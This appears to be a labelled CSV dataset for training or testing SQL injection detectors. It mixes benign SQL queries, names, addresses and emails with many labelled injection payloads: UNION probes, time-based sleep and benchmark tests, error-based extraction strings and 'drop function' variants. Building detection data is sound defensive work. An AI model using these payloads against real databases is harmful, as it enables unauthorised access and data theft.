Query,SELECT,UNION,OR,AND,Label
SELECT wheel ( s )  FROM cow LEFT JOIN,1,0,0,0,0
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null#",1,1,0,0,1
select   (  case when   (  2716  =  8138  )   then 2716 else 2716*  (  select 2716 from mysql.db  )   end  )  #,1,0,0,0,1
1'+  (  select 'vnue' where 5807  =  5807,1,0,0,0,1
"   SELECT headed, statement+ ', ' + supply+ ' ' + because+ ', ' + whenever AS simple  FROM bottom",1,0,0,0,0
-5026' or   (  8459  =  8459  )  *4906 and 'uavj' like 'uavj,0,0,1,1,1
yuraj,0,0,0,0,0
1.76488E+15,0,0,0,0,0
SELECT * FROM all WHERE paint BETWEEN '1996-07-01' AND '1996-07-31',1,0,0,1,0
lotfaga,0,0,0,0,0
1  )   where 3671  =  3671,0,0,0,0,1
"   SELECT clock,bare,fruit,mile,tree     (  (  bottom JOIN hurried ON planning.state =  society.chair )   INNER JOIN weON Orders.bar =  child.sheepID ) ",1,0,1,0,0
refriega,0,0,0,0,0
"   SELECT COUNT ( CustomerID ) , CountryFROM CustomersGROUP BY Country",1,0,0,0,0
SELECT * FROM glass  WHERE sat = blanket,1,0,0,0,0
27597488h,0,0,0,0,0
"calle ducado de neopatria 63, 12-h",0,0,0,0,0
"-5903%'  )   union all select 8293,8293,8293,8293,8293,8293,8293,8293#",1,1,0,0,1
"1  )   where 9469  =  9469 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,0,1,0,1
5.34929E+15,0,0,0,0,0
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 367848 )  ORDER BY meta_id ASC",1,0,1,0,0
"c/ fernandez shaw, 177 1-e",0,0,0,1,0
"1""  )   where 3390  =  3390",0,0,0,0,1
if  (  6647  =  2179  )   select 6647 else drop function zvlq--,1,0,0,0,1
pillars4,0,0,0,0,0
"1""  )   where 7471  =  7471 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,0,1,0,1
SELECT AVG ( impossible ) FROM pilot SELECT SUM ( by ) ,1,0,0,0,0
-2372' or 1783  =  2656,0,0,1,0,1
-8047' or 3038  =  3038,0,0,1,0,1
select case when 3920  =  4402 then 1 else null end--,1,0,0,0,1
SELECT thrown ( s ) FROM motion INNER JOIN,1,0,0,0,0
josee,0,0,0,0,0
"1' union all select null,null,null,null,null,null,null,null,null#",1,1,0,0,1
"-5703'  )   or elt  (  2972  =  8708,8708  )  ",0,0,1,0,1
"-8065""   )    )     )   order by 1--",0,0,1,0,1
1' where 5547  =  5547,0,0,0,0,1
-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,1,1,0,0,1
"1',  (  case when 2872  =  2872 then 1 else null end  )  ",0,0,0,0,1
SELECT moving ( s FROM none RIGHT JOIN,1,0,0,0,0
SELECT MIN ( drove )  AS list FROM tears,1,0,0,0,0
"-4371'   )    )     )   union all select 7465,7465,7465,7465,7465,7465,7465#",1,1,0,0,1
"1""   )    )    as ftts where 3671  =  3671 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",1,0,0,1,1
SELECT pressure ( s FROM long RIGHT JOIN,1,0,0,0,0
"  SELECT * FROM amount WHERE now NOT IN  ( 'joy', 'action', 'anyone' )  ",1,0,0,0,0
SELECT * FROM smile 3,1,0,0,0,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (   'wusq'  =  'wusq",1,0,0,1,1
"1%"" or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""%""  =  """,1,0,1,1,1
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_wp_wps_bg_file_sync_1_process_lock' LIMIT 1,1,0,0,0,0
1'+  (  select 'xbyn' where 6881  =  6881,1,0,0,0,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""nxvp""  =  ""nxvp",1,0,0,1,1
SELECT TOP 3 * FROM has WHERE frequently = 'slipped',1,0,0,0,0
lightnin@grupodescansoyhogar.web,0,0,0,0,0
1%'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  '%'  =  ',1,0,0,1,1
redolat cardiel,0,0,0,0,0
26111,0,0,0,0,0
"1""  )   or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and   (  ""gcnq"" like ""gcnq",1,0,1,1,1
"INSERT INTO unless ( by, chair, letter, porch, came, ready )  VALUES  ( 'lost', 'cause'. happy', 'swung', 'detail', 'being', 'needed' )  ",0,0,1,0,0
"calle finlandia, 46, 6-a",0,0,0,1,0
"   SELECT pour, maybe, balloonFROM halfway WHERE month  IS NOT NULL",1,0,0,0,0
"1""  )   where 7753  =  7753",0,0,0,0,1
"1' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and 'eovg' like 'eovg",1,1,1,1,1
"1' where 4272  =  4272 union all select null,null,null,null#",1,1,0,0,1
SELECT * FROM corn,1,0,1,0,0
brando@elsentidodelavida.lc,0,0,0,1,0
"SELECT t.*, tt.* FROM wp_terms AS t INNER JOIN wp_term_taxonomy AS tt ON t.term_id  =  tt.term_id WHERE tt.taxonomy IN  ( 'wp_theme' )  AND t.name IN  ( 'houzez-child' ) ",1,0,0,1,0
" select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",1,1,1,0,1
"1%' union all select null,null,null,null,null,null,null,null,null--",1,1,0,0,1
raush.runyon@discoteatre.fk,0,0,0,0,0
coursdev,0,0,0,0,0
"  SELECT saddle AS closer, promised AS [mind]  FROM fireplace",1,0,0,0,0
1  )   where 2223  =  2223,0,0,0,0,1
"1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'qfvg'  =  'qfvg",1,0,0,1,1
SELECT TOP 3 * FROM airplane WHERE president = 'hollow' SELECT * FROM tube,1,0,0,0,0
calle jeremias 14 7b,0,0,0,0,0
if  (  3831  =  9321  )   select 3831 else drop function ybru--,1,0,0,0,1
1656,0,0,0,0,0
"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",1,0,0,1,1
SELECT ocean ( s )  FROM even UNION ALL,1,1,0,0,0
40444,0,0,0,0,0
"1,  (  select   (  case when   (  6750  =  6750  )   then 1 else 6750*  (  select 6750 from information_schema.character_sets  )   end   )    )   ",1,0,1,0,1
" select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",1,1,0,0,1
5323,0,0,0,0,0
SELECT steep ( s )  FROM nervous SELECT sat ( s ) ,1,0,0,0,0
SELECT * FROM  ( SELECT silly FROM thin ) ,1,0,0,0,0
lavada,0,0,0,0,0
" SELECT * FROM putting ORDER BY thought, nice",1,0,1,0,0
90230020p,0,0,0,0,0
"1""   )    )    as wssb where 5772  =  5772",0,0,0,0,1
"  SELECT showID AS ID, immediately AS brave FROM warn",1,0,0,0,0
vajil-la,0,0,0,0,0
SELECT * FROM lungs WHERE advice = 'egg' LIMIT 3,1,0,0,0,0
"  SELECT TIME ( ""2017-08-15 19:30:10"" ) ;",1,0,0,0,0
"reinosa 98, 13-e",0,0,0,0,0
"  SELECT * FROM friend WHERE castle NOT IN  ( 'recall', 'post', 'four' )  ",1,0,0,0,0
elbeze,0,0,0,0,0
SELECT * FROM dark FETCH FIRST 50 PERCENT ROWS ONLY,1,0,0,0,0
"  SELECT * FROM right WHERE upward IN  ( 'music', 'city', 'jet' )  ",1,0,0,0,0
"1%'  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1,0,0,1,1
sant celoni,0,0,0,0,0
1'||  (  select 'vwmg' where 7928  =  7928,1,0,0,0,1
lucila2,0,0,0,0,0
SELECT ProductName FROM Products,1,0,0,0,0
"  SELECT * FROM shirt WHERE contrast NOT IN  ( 'got', 'receive', 'riding' )  ",1,0,0,0,0
"1%""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1,0,0,1,1
1   )    )    as qsos where 2721  =  2721 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1,0,0,0,1
SELECT * FROM in WHERE another BETWEEN '1996-07-01' AND '1996-07-31',1,0,0,1,0
"-9135""   )    )    or 6872  =  6872 and    (    (   ""fllx""  =  ""fllx",0,0,1,1,1
"1 and make_set  (  9542  =  8888,8888  )  -- idkn",0,0,0,1,1
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  'pags'  =  'pags,1,0,0,1,1
montell i martinet,0,0,0,0,0
SELECT * FROM fur WHERE habit BETWEEN 'grown' AND 'reason',1,0,0,1,0
"  SELECT afterID AS ID, having AS fruit FROM partly",1,0,0,0,0
SELECT option_value FROM wp_options WHERE option_name  =  '_site_transient_wp_wps_bg_image_sync_1_process_lock' LIMIT 1,1,0,0,0,0
backer@showcars.com.co,0,0,0,0,0
056cun95v08ac497,0,0,0,0,0
"1 where 9083  =  9083 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",0,0,0,0,1
"1%""  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and   (  ""%""  =  """,0,0,1,1,1
"1""  )   union all select null,null,null,null,null,null#",1,1,0,0,1
"1,extractvalue  (  9788,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  9788  =  9788,1   )    )     )  ,0x717a767a71   )    )   ",1,0,0,0,1
burguillos de toledo,0,0,0,0,0
SELECT * FROM market FETCH FIRST 50 PERCENT ROWS ONLY,1,0,0,0,0
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  '%'  =  '",1,0,0,1,1
"   SELECT weather, which, runFROM cowboy WHERE idea  IS NOT NULL",1,0,0,0,0
domingo,0,0,0,0,0
"1""  )   as lvbm where 8179  =  8179",0,0,0,0,1
"1'   )    )    and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,0,0,1,1
SELECT Count ( * )  AS cutting,1,0,0,0,0
"1%'   )    )     )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )    and    (    (     (  '%'  =  '",0,0,1,1,1
SELECT * FROM hello,1,0,0,0,0
"-7860'   )    )     )   union all select 7420,7420,7420,7420,7420,7420,7420,7420,7420,7420--",1,1,0,0,1
6703,0,0,0,0,0
SELECT TOP 50 PERCENT * FROM eventually,1,0,0,0,0
" select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",1,0,1,0,1
afiligr*anado,0,0,0,0,0
select case when 7717  =  7717 then 1 else null end--,1,0,0,0,1
"1%'   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",0,0,1,0,1
"1  )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and   (  9509  =  9509",1,0,0,1,1
drop-box,0,0,0,0,0
1'   )    )    as hqhs where 5383  =  5383,0,0,0,0,1
7361,0,0,0,0,0
SELECT * FROM escape WHERE everybody = 'action' LIMIT 3,1,0,0,0,0
SELECT * FROM occur 3,1,0,0,0,0
-7864 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   # twpw,1,0,1,0,1
compte,0,0,0,0,0
SELECT COUNT ( shine )  FROM poet,1,0,0,0,0
SELECT AVG ( cent )  FROM slipped  SELECT SUM ( mind ) ,1,0,0,0,0
"1""   )    )    or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",0,0,1,0,1
"  UPDATE daughter SET doubt =  'door', City =  'told' WHERE factor =  outline",0,0,1,0,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ||'",1,0,0,0,1
SELECT COUNT ( ill ) FROM thing,1,0,0,0,0
"INSERT INTO chair ( answer, action, pictured, disease, end, screen )  VALUES  ( 'scene', 'idea'. likely', 'made', 'donkey', 'land', 'atomic' )  ",0,0,0,1,0
entwistle_ruetting@comonuevo.ro,0,0,0,0,0
SELECT * FROM coach WHERE fall = 'seems'  AND  ( including = 'factor' OR struck = 'mostly' ) ,1,0,1,1,0
"1"" and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  ",0,0,0,1,1
"1%'  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  '%'  =  '",1,0,0,1,1
dick,0,0,0,0,0
"1'  )   where 6988  =  6988 union all select null,null,null,null,null,null,null,null--",1,1,0,0,1
"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",0,0,1,0,1
SELECT * FROM not WHERE change BETWEEN '1996-07-01' AND '1996-07-31',1,0,0,1,0
bello.sandor@hipergipuzkoa.to,0,0,1,1,0
end and   (  'jzlr'  =  'jzlr,0,0,0,1,1
"1%""   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   ""%""  =  """,1,0,0,1,1
select   (  case when   (  8618  =  8706  )   then 8618 else 8618*  (  select 8618 from mysql.db  )   end  )  #,1,0,0,0,1
"1'||  (  select 'mzhj' where 9677  =  9677 union all select null,null,null--",1,1,0,0,1
"1%""  )   and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and   (  ""%""  =  """,1,1,1,1,1
SELECT * FROM low  WHERE girl NOT LIKE '[courage]%',1,0,0,0,0
"-9606 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  # iuij",1,0,1,0,1
1729,0,0,0,0,0
"  SELECT * FROM fallen WHERE whistle IN  ( 'strip', 'herself', 'direction' )  ",1,0,0,0,0
1'  )   as jztg where 1222  =  1222 or sleep  (  5  )  #,0,0,1,0,1
1'  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  'izyf'  =  'izyf,1,0,0,1,1
"1   )    )    and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",0,0,0,1,1
"  UPDATE bean SET well =  'replied', City =  'gain' WHERE mathematics =  twice",0,0,0,0,0
8.88987E+15,0,0,0,0,0
"1'   )    )    and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (   'zknl'  =  'zknl",0,0,0,1,1
end and   (  'uxzv'  =  'uxzv,0,0,0,1,1
SELECT human ( s )  FROM sheet FULL OUTER JOIN,1,0,0,0,0
"-5062""   )    )     )   or   (  1069  =  8974  )  *8974 and    (    (     (  ""hsge""  =  ""hsge",0,0,1,1,1
7.96454E+15,0,0,0,0,0
" select * from users where id  =  1 +$+. union select null,@@VERSION -- 1",1,1,0,0,1
"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'fwok' like 'fwok",1,0,0,1,1
SELECT * FROM frozen WHERE grain = 'car'  AND  ( joined = 'wherever' OR month = 'sight' ) ,1,0,1,1,0
o.donnel,0,0,0,0,0
salvina,0,0,0,0,0
"-6075' union all select 9988,9988,9988,9988,9988,9988,9988,9988,9988#",1,1,0,0,1
7529,0,0,0,0,0
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",1,1,1,0,1
SELECT AVG ( Price ) FROM friend,1,0,0,0,0
1'+  (  select xwcl where 7997  =  7997,1,0,0,0,1
1' in boolean mode  )   and 5725  =  5552#,0,0,0,1,1
"1  )   where 6784  =  6784 and elt  (  3114  =  3114,sleep  (  5   )    )   #",0,0,0,1,1
18212,0,0,0,0,0
SELECT * FROM around FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM certainly,1,0,0,0,0
1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1,0,1,0,1
r4a8e3a,0,0,0,0,0
SELECT * FROM find WHERE Price NOT BETWEEN 10 AND 20,1,0,0,1,0
"-3082""  )   where 1082  =  1082 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1,0,1,0,1
"c/ huescar 60,",0,0,0,0,0
5a09la,0,0,0,0,0
fermentadora,0,0,1,0,0
"   SELECT pool, thick, relationship FROM motion WHERE stock  IS NULL",1,0,0,0,0
"-8793' where 3853  =  3853 union all select 3853,3853,3853,3853,3853,3853,3853,3853#",1,1,0,0,1
SELECT * FROM  ( SELECT bridge FROM system ) ,1,0,0,0,0
"1'  )   as xagu where 9088  =  9088   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )  --",1,0,0,0,1
"-8410"" or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""xhzr""  =  ""xhzr",1,0,1,1,1
SELECT joy ( s )  FROM general UNION ALL,1,1,0,0,0
-4954'  )   or 8571  =  8571--,0,0,1,0,1
"1' union all select null,null#",1,1,0,0,1
"1""  )   where 6478  =  6478 union all select null,null,null,null,null,null#",1,1,0,0,1
"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,0,0,0,1
mannkopf.gray@ajuntamentbcn2-0.il,0,0,0,0,0
"1""  )   where 9062  =  9062",0,0,0,0,1
select sleep  (  5  )   and    (    (     (  'qjsc'  =  'qjsc,1,0,0,1,1
12190,0,0,0,0,0
"-1337""  )   union all select 7508--",1,1,0,0,1
"  SELECT City, Country FROM CustomersWHERE Country = 'Germany'UNION SELECT City, Country FROM Suppliers",1,1,0,0,0
begues,0,0,0,0,0
"calle sant pau, 117,",0,0,0,0,0
arrazua-ubarrundia,0,0,0,0,0
28090,0,0,0,0,0
"1""   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1,0,0,1,1
SELECT TOP 3 * FROM second WHERE region = 'expect' SELECT * FROM hard,1,0,0,0,0
if  (  4735  =  8907  )   select 4735 else drop function qigo--,1,0,0,0,1
SELECT water,1,0,0,0,0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual",1,0,0,0,1
SELECT * FROM history WHERE NOT complex = 'rise'  AND NOT full = 'greatly',1,0,1,1,0
"c/ valtravieso s/n,",0,0,0,0,0
es3regamiento,0,0,0,0,0
SELECT growth ( s )  FROM market,1,0,0,0,0
"1'  )   as omtb where 1183  =  1183 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,0,0,1,1
select * from users where id  =  1 &@ or 1  =  1 -- 1,1,0,1,0,1
